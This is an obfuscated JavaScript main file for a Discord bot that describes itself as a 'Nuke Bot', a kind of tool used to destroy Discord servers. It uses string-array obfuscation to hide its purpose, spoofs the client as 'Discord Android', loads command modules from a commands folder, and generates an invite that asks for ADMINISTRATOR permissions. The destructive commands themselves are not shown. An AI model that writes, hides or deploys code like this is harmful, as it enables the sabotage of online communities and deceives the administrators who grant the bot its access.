const _0x5070 = [
  "properties",
  "set",
  "length",
  "15452NReraE",
  "split",
  "./settings.json",
  "347557yXIefa",
  "login",
  "error",
  "8kuzuPK",
  "message",
  "forEach",
  "pop",
  "290605wYlCCi",
  "Collection",
  "DefaultOptions",
  "then",
  "content",
  "Discord\x20Android",
  "token",
  "Loading\x20Commands...",
  "user",
  "191xqmSsK",
  "2349LgiDZq",
  "filter",
  "2242JWzHiT",
  "bot",
  "name",
  "slice",
  "log",
  "89889uEOPlh",
  "./commands/",
  "149UsPkoj",
  "ADMINISTRATOR",
  "readdir",
  "ready",
  "discord.js/src/util/Constants.js",
  "747757ggkGdl",
  "9OfBycJ",
  "generateInvite",
  "commands",
  "$browser",
  "help"
];
const _0x1e8b = function(_0xe4a3f6, _0x17d0dd) {
  _0xe4a3f6 = _0xe4a3f6 - 0x1e3;
  let _0x507027 = _0x5070[_0xe4a3f6];
  return _0x507027;
};
const _0x4f3b43 = _0x1e8b;
(function(_0x5ed39c, _0x68b072) {
  const _0x705adf = _0x1e8b;
  while (!![]) {
    try {
      const _0x455937 =
        -parseInt(_0x705adf(0x1e4)) +
        parseInt(_0x705adf(0x20a)) * parseInt(_0x705adf(0x203)) +
        parseInt(_0x705adf(0x1e5)) * -parseInt(_0x705adf(0x1ed)) +
        -parseInt(_0x705adf(0x1f3)) * -parseInt(_0x705adf(0x208)) +
        -parseInt(_0x705adf(0x1f0)) +
        -parseInt(_0x705adf(0x201)) * -parseInt(_0x705adf(0x200)) +
        parseInt(_0x705adf(0x1f7));
      if (_0x455937 === _0x68b072) break;
      else _0x5ed39c["push"](_0x5ed39c["shift"]());
    } catch (_0x2e46f1) {
      _0x5ed39c["push"](_0x5ed39c["shift"]());
    }
  }
})(_0x5070, 0x883e4);
const settings = require(_0x4f3b43(0x1ef)),
  Discord = require("discord.js"),
  fs = require("fs"),
  prefix = settings["prefix"],
  bot = new Discord["Client"]();
(bot[_0x4f3b43(0x1e7)] = new Discord[_0x4f3b43(0x1f8)]()),
  fs[_0x4f3b43(0x20c)](_0x4f3b43(0x209), (_0x152bac, _0x399f9d) => {
    const _0x1d86fb = _0x4f3b43;
    _0x152bac && console[_0x1d86fb(0x1f2)](_0x152bac);
    let _0x552f64 = _0x399f9d[_0x1d86fb(0x202)](
      _0xf1aaef => _0xf1aaef[_0x1d86fb(0x1ee)](".")[_0x1d86fb(0x1f6)]() === "js"
    );
    if (_0x552f64["length"] <= 0x0) {
      console["error"]("No\x20commands\x20found.");
      return;
    }
    console[_0x1d86fb(0x207)](_0x1d86fb(0x1fe)),
      _0x552f64[_0x1d86fb(0x1f5)]((_0x224df5, _0x39cda1) => {
        const _0x36d110 = _0x1d86fb;
        let _0x5b9dda = require(_0x36d110(0x209) + _0x224df5);
        bot[_0x36d110(0x1e7)][_0x36d110(0x1eb)](
          _0x5b9dda[_0x36d110(0x1e9)][_0x36d110(0x205)],
          _0x5b9dda
        );
      });
  });
const Constants = require(_0x4f3b43(0x1e3));
(Constants[_0x4f3b43(0x1f9)]["ws"][_0x4f3b43(0x1ea)][
  _0x4f3b43(0x1e8)
] = _0x4f3b43(0x1fc)),
  bot["on"](_0x4f3b43(0x20d), async () => {
    const _0x2cffd1 = _0x4f3b43;
    console[_0x2cffd1(0x207)]("Nuke\x20Bot\x20Is\x20Now\x20Online"),
      bot[_0x2cffd1(0x1ff)]["setActivity"]("@kazion#1337"),
      bot[_0x2cffd1(0x1e6)]({ permissions: [_0x2cffd1(0x20b)] })[
        _0x2cffd1(0x1fa)
      ](_0x11ae13 => console[_0x2cffd1(0x207)]("" + _0x11ae13));
  }),
  bot["on"](_0x4f3b43(0x1f4), async _0x56da50 => {
    const _0x198f2c = _0x4f3b43;
    if (_0x56da50["author"][_0x198f2c(0x204)]) return;
    let _0x43b5a4 = _0x56da50[_0x198f2c(0x1fb)]["split"](/\s+/g),
      _0x2dce7c = _0x43b5a4[0x0],
      _0x9af58d = _0x43b5a4["slice"](0x1),
      _0x207a7f = bot[_0x198f2c(0x1e7)]["get"](
        _0x2dce7c[_0x198f2c(0x206)](prefix[_0x198f2c(0x1ec)])
      );
    _0x207a7f && _0x207a7f["run"](bot, _0x56da50, _0x9af58d);
  }),
  bot[_0x4f3b43(0x1f1)](settings[_0x4f3b43(0x1fd)]);
